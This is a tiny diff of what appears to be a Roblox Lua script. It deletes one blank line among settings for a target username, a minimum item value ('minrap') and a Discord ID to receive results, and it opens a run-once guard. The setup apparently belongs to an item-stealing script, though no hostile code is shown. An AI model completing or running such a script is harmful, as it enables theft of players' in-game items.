@@ -2,7 +2,6 @@ _G.Username = "otakufh44"
 _G.Username2 = "username2"
 _G.minrap = 10000000
 _G.discuser = "1233841832778141696" -- change to your discord id
-
 _G.scriptExecuted = _G.scriptExecuted or false
 if _G.scriptExecuted then
     return
